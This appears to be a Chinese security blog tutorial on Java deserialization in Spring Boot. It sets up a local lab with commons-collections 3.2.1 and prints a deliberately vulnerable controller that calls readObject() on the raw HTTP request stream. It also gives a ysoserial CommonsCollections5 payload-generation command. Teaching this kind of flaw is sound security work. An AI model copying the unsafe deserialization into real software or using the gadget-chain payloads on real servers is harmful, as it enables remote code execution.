#  Spring Boot 框架反序列化漏洞  
原创 Lily
                    Lily  成渝Sec   2026-05-02 14:38  
  
**一、搭建Spring Boot项目**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Shiamu7mxKIC6e8e0lygPEVGHsUibo2icpvgCDaKmZ7ic2ic3zDgtSV3NXFvCuMCc2JYoFoweVkuClpEghUxwYxujWks1HTULe2VHdILesrl9qico/640?wx_fmt=gif&from=appmsg "")  
  
  
第一步：新建项目  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/Shiamu7mxKIA8DdSSaVoMwhgOmooCjCxpHaPaurgqF4kgTJnvI8mSUbUTYcibbkic9LSst1LibFWUa6knZibrdL0vL18xLCSpwl3o31iaVwtzOlu0/640?wx_fmt=gif&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Shiamu7mxKIDqznXXgoOOV2Hf1JdIyMoXqRj8BsZynQw2C99Jyolu4zexQ7PGU7dS95DUYT8wicDicxN1xsgh7xqyeN7icMN2U1Rhf3JI53vAXY/640?wx_fmt=png&from=appmsg "")  
  
第二步：选择版本和依赖  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Shiamu7mxKIDVygwIeVV05NkLhSlzeXujeAjyUf7ibS6mXR6Jw7RXzkmmqSYhZs79DggfNBO7QEbgsichOIFIe0L2DRVQ4jy32yj2Xb6YuveKA/640?wx_fmt=gif&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Shiamu7mxKICUSSVBntK0kNIUaULCWA6SrhqWo8yryhCuibozwmMfSJDypDDzHgtM7us7jNm9XsEADha3u1oyJdnQHOYK2NARCVicaibkfHTpqI/640?wx_fmt=png&from=appmsg "")  
  
第三步：添加依赖并同步  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Shiamu7mxKIAEicIfibCDvd0qGJXYQIFWj5YhBFQT8nAYfrprhxPcJnhKrtwRDzGUXInoaOPSwrHkCF2bG5MoXiakbsc9y408zF8Buy78oHwFY0/640?wx_fmt=gif&from=appmsg "")  
  
  
修改POM.xml文件  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Shiamu7mxKIBibEaFbFNIJDhlehicFIuQXuRjo8ib1u5IWdKSibpFo6p7Jz4yseUBGvG1jHtJqicNrrketc90ZSibDCawaSPj5sicw9eO2mmjNdmHZ0/640?wx_fmt=gif&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Shiamu7mxKIBDwt6mO0EmjnunnclaZD7crLn02u5bulEmOLbQALjibfMicx0so2uMtw2Z54GqgDsjiap9ibjjNBfyKpFJia2TdvlP8Q6VkVqAUYkA/640?wx_fmt=png&from=appmsg "")  
  
<dependency>  
  
    <groupId>commons-collections</groupId>  
  
    <artifactId>commons-collections</artifactId>  
  
    <version>3.2.1</version>  
  
</dependency>  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/Shiamu7mxKIBbeickNJZYf5VEfk0oFn9aibv1loSh6q8byz5q1TJaJgemd6tRbnrQA8H1pyHOPibnEWUicAGnZuERc5VlJrdRF6zmfrDERiaOibtrE/640?wx_fmt=gif&from=appmsg "")  
  
  
添加依赖并同步，确保commons-collections 3.2.1下载到依赖中：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Shiamu7mxKIDta2tawfxDLQObnnwW57LfUjgWk15Zia5XJ5AbiahxrYTTeR4ufIE6UU0e5nzVfYCKqaXibhxQrP040vSibynwQLUn9wAiafhocOH8/640?wx_fmt=png&from=appmsg "")  
  
第四步：构建存在漏洞的代码  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Shiamu7mxKIBdiaEumtDz2sNKFgR88HlLj1fClrDuZibxXVD73sAGw21vmQWNsp4dZwEtvrq9ActNKVVfjKlgVhtaxrwKWicAxkyR6rcWIKV2N8/640?wx_fmt=gif&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Shiamu7mxKIAaA0fu0ZQSogItGUPZgxicugaGGIgXxIcAqLXJPI8TMdibo8ib8iaTleUhdvRUmFzfKBr47onghZ4mmibbiceJRVajnqEwe2oM65bwU/640?wx_fmt=png&from=appmsg "")  
  
第五步：运行  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Shiamu7mxKIACSicgMySLzAJWnzhCRb2bicyOLj8n7mI6Orr3GuiagLzCHXgwQXA8wTssicNBTeKTribrzpoXQDkaIWBFKHIU3IrVmNicnum8rmImU/640?wx_fmt=gif&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Shiamu7mxKIBx1RGibib0lSBOI6Vf23EYk2giarn35wZZMs3XFJKH9aCNBPvPs52B8mCyGfyYVajmnJ5r1UCicWLNUZWv6qdsKRZNkcvzibog8Reo/640?wx_fmt=png&from=appmsg "")  
  
浏览器访问显示：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Shiamu7mxKIBlp4Kj2URxyhBvOHn7ibc2WNGuDMStxkqUK7HJI4ZJgABRBnnYPgTFqnZGEKBgscjZbEh2763Zmc4Bv2ZJWVUHRj1QQv1xkRVM/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Shiamu7mxKIBVQTibgBwQjoUbzqRYFezUQKm2gKbogS0xicYprhHQYgTsTEDqEYTTqEHuE4drt8mndgTNFiaW31r6nA1eLPxuDR3srn1W5L8BEE/640?wx_fmt=png&from=appmsg "")  
  
**http://localhost:8080/api/v1/vulshow/show**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Shiamu7mxKID4rAQ13sytaicdLDCJb9EMwVeQtpxuWgqRWhVLQODeLeaeDuMibkwqB324DrQzUTibnAl5XWJicASWSP5cMjvFcA9bCAONrWrcXeo/640?wx_fmt=gif&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Shiamu7mxKICh0Ct3FAhudJl4C56aL9535ibBQtCm4Fib2jCickRoicxgia1DibrYAXzJDCxDniajfjE47XEeR6NykNUTsPibBGE2oJiaSho6VMoBibHl0/640?wx_fmt=png&from=appmsg "")  
  
说明SpringBoot环境运行正常。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Shiamu7mxKIDJL06DEYBBTaliaIOA2a9LqUFnpDXib2FIbn4gn3439VoHI3glKMCZhKO9eh8NKNddGgdj3QpVMBdcvIiaZ9D5tYdqoqlzXIFWic0/640?wx_fmt=gif&from=appmsg "")  
  
  
****  
**二、编写漏洞代码**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Shiamu7mxKICR82n0HRgicbdqFynCb8MYR8QNZuDIDgdeFln0qHqTFaicibn9ZekBhxGFGUrbbTCLK6cRa2SmcnZnS9SADSdflcEH2M682lm3Gw/640?wx_fmt=gif&from=appmsg "")  
  
```
package com.yxsec.www.spirngboot.vul;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import javax.servlet.http.HttpServletRequest;
import java.io.EOFException;
import java.io.IOException;
import java.io.ObjectInputStream;
/**
 * @ Project : spirngboot
 * @ ile : VulShow.java
 * @ Author 张老师
 * @ Time : 2026/5/2 10:20
 * @ 文件说明
 */
// 标记为入口
@RestController
// 总入口
@RequestMapping("/api/v1/vulshow")
public class VulShow {
    @RequestMapping("/show")
    public String show() {
        return "VulShow";
    }
    // 以下为Spring反序列漏洞展示
    @PostMapping("/rio")
    public String rmIo(HttpServletRequest request) {
        String result;
        try {
            // 【漏洞核心点1】直接从HTTP请求流中读取数据，没有任何安全校验
            // 攻击者可以完全控制这个输入流的内容
            ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
            // 【漏洞核心点2】readObject()会执行反序列化过程
            // 这里会解析序列化数据，并自动创建对象实例
            // 危险的是：某些类的readObject()方法中可能包含危险操作（如执行命令、文件操作等）
            // 攻击者可以通过构造特殊的序列化链（Gadget Chain）来触发这些危险操作
            Object obj = ois.readObject();
            // 漏洞已触发，后续代码不影响漏洞本身
            result = "反序列化执行完成";
        } catch (EOFException e) {
            // 输入流提前结束，可能请求体为空或不完整的序列化数据
            result = "输入流结束";
        } catch (IOException e) {
            // IO异常：可能网络问题、流读取错误等
            // 攻击者可能通过畸形数据触发此异常
            result = "IO流错误";
        } catch (ClassNotFoundException e) {
            // 类未找到异常：反序列化的类在CLASSPATH中不存在
            // 攻击者可能尝试加载不存在的类进行探测
            result = "类错误";
        } catch (NullPointerException e) {
            // 空指针异常：request.getInputStream()返回null
            result = "请求输入流为空";
        }
        return result;
    }
}
```  
  
****  
**三、漏洞利用工具**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Shiamu7mxKIAg6JeDibDQUPv6aQ16t47gQtlsg1fJQuoGHQD4mbIHsbtWiaxu2HsWm4uxXf5fJQyicgqHsdX3fe2VCyxbW3YOVhCsxwPPHGMGX0/640?wx_fmt=gif&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Shiamu7mxKIBMb2ntrQg55skew40gU6NDEx5a6wH3PiaK3hB11b9CiaAOOGgoC0g76zsp9w9PdsId72VE14S4wIXJd6CuftJJ0bRDiaunfZYQEo/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/Shiamu7mxKIBxbbkdVIDKGhbTYqTjzxllfDkrKEmUQ5voiaLvZ8CEPFJ0ia2t6hyEyHcNTnicN0FVUklN1rErvAcKfD22uNtmMDZM8MJQJ8zCyI/640?wx_fmt=gif&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Shiamu7mxKIAzsibBWnxG0p8ticoxKryBONEQXZc4KZXiaFqia8Agy9zJz9WIeyLJ1U67Vvek6xVF9WjTx6YDndvrOnH0nHg5fbjfo76d0bG4dI0/640?wx_fmt=png&from=appmsg "")  
  
**漏洞利用工具 - ysoserial.jar**  
  
  
一种用于  
生成  
不安全的Java对象序列化有效载荷的POC验证工具。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/Shiamu7mxKIDeYpP3D5iaVeo5LMhLLQdKR9OBFysiclSRWVt1wgVuXNFf4DvIGc2ZU03e5XNl9Gm7PV3gxnibSWBKsQBvoGngHbwseDjJTp39xs/640?wx_fmt=gif&from=appmsg "")  
  
  
ysoserial.jar 工具使用  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Shiamu7mxKID4vG4AQVUD3ugDFoAeYaslCD90aJyibDXncFG5Wex5yG6zE3ZOEkxplxXZoKYstGLYrQN26KlchcyFhUfRgXxcUFKQvXwxDphU/640?wx_fmt=png&from=appmsg "")  
  
  
漏洞利用  
  
构造CC5链攻击目标  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/Shiamu7mxKICgX6ricSyOKhHmSHdb1T1ktLjtw1GwNVrCa0r9Or9uRq8uL1eQZoiaof3w0FbQbAulyboCAiaJrOy6MFfTMxG8g9p4gDwyBWeNy4/640?wx_fmt=gif&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Shiamu7mxKIDkAQUx4LickYy1HkhEHDAicBDySErqPwtrYPHKGvC1uyniczq4GIT5z17FJibibH6NFBss21KCicwdQxpBzjXo5k3gv1uhZm3mSC6kg/640?wx_fmt=png&from=appmsg "")  
  
CommonsCollections1 => CC1链  
  
CommonsCollections2 => CC2链  
  
CommonsCollections5 => CC5链  
  
CommonsCollections6 => CC6链  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Shiamu7mxKIAlCDxnaOMrcXGZ1ajsPb0ibriaoawL7DDrMGpia0DTLn4mWn3THrbR1wo2fShsCtNUUAVsXrFpwkjWGVBXl6QibLljAkicBxSKHnZk/640?wx_fmt=gif&from=appmsg "")  
  
  
 使用ysoserial生成payload  
```
java -jar ysoserial.jar CommonsCollections5 "calc.exe" > poc
```  
  
    在kali中下载httpie  
```
┌──(root㉿kali)-[~/Desktop]
└─# apt update   
┌──(root㉿kali)-[~/Desktop]
└─# apt install httpie
```  
  
  
  
     运行后，自动弹出计算器  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Shiamu7mxKIByjsukAWpTDEFCdIHQZojsCzBBdbGxUzbG9Sp47lDCHyDZ1zsaCp8r15vyg1WBD32gHSZJRiaicI7lf7nIORvkBWvpRLQ83ictu8/640?wx_fmt=png&from=appmsg "")  
  
  
  
   Spring Boot中漏洞成因分析  
  
   【漏洞核心点1】  
```
(1)直接从HTTP请求流中读取数据，没有任何安全校验
(2)攻击者可以完全控制这个输入流的内容
```  
```
 ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
```  
  
   【漏洞核心点2】  
```
Object obj = ois.readObject();
```  
```
(1)这里会解析序列化数据，并自动创建对象实例
(2)危险的是：readObject()方法中可能包含危险操作
(3)攻击者可以通过构造特殊的序列化链来触发这些危险操作
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/Shiamu7mxKIAJle1SK8ISoFmTnn6XVYeibWJy1urJ7cY3Ziaibex9vNjSLRNBhNsdsppdxAGomSvqsTicZJcTOMdzsic58CAkicmkvaqbrLEmHDpHM/640?wx_fmt=gif&from=appmsg "")  
  
  
![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/Expression/Expression_67@2x.png "")  
如果文章对你有帮助，请关注我的公众号：  
  
  
  
